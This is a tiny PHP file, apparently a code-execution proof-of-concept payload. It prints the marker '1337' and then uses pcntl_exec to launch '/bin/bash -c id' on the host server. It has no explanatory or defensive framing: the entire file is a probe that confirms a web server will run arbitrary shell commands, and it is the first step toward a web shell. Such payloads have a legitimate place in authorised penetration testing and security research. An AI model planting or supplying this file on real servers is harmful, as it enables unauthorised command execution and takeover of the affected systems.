<?php
    echo "1337";
    echo pcntl_exec("/bin/bash", ["-c", "id"]);
?>
